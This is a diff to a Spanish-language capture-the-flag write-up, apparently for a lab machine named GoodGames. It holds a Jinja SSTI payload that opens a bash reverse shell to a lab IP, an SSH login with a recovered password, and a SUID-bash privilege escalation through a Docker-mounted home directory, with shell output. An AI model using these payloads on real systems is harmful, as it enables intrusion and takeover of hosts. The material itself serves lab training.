@@ -115,7 +115,7 @@ Con **Wappalyzer** se ejecuta **Python** por lo que parece una vulnerabilidad **
 Es vulnerable a **SSTI** por lo que realizamos un payload que contiene una Reverse Shell.
 
 ```
-{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"').read() }}
+{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.8/4444 0>&1"').read() }}
 ```
 
 Nos ponemos en escucha.
@@ -160,7 +160,31 @@ Comencé a buscar credenciales de SSH en la máquina y finalmente encontré la c
 
 <figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
-```bash
-ssh-keygen -t rsa -b 4096 -f ./id_rsa
+Vemos que el puerto 22 y 80 están abiertos, por lo que intentamos conectarnos por SSH con el usuario augustus utilizando la contraseña que habíamos encontrado previamente (superadministrator).
 
+```bash
+ssh augustus@172.19.0.1
+whoami
+augustus
 ```
+
+Como el directorio home del usuario augustus está montado en el contenedor **Docker** y tenemos acceso como usuario **root**, podemos trasladar un binario con permisos **SUID** al home de **augustus** para escalar privilegios a root en el host.
+
+```bash
+augustus@GoodGames:~$ cp /bin/bash .
+augustus@GoodGames:~$ ls
+bash  user.txt
+
+root@3a453ab39d3d:/home/augustus chown root:root /home/augustus/bash  
+root@3a453ab39d3d:/home/augustus chmod +s /home/augustus/bash
+
+augustus@GoodGames:~$ ./bash -p
+bash-5.1# id
+uid=1000(augustus) gid=1000(augustus) euid=0(root) egid=0(root) groups=0(root),1000(augustus)
+bash-5.1# whoami
+root
+```
+
+Ahora que hemos logrado elevar nuestros privilegios a **root** en la máquina víctima, podemos proceder a leer la flag del usuario **root**.
+
+<figure><img src="../../.gitbook/assets/image (1283).png" alt=""><figcaption></figcaption></figure>
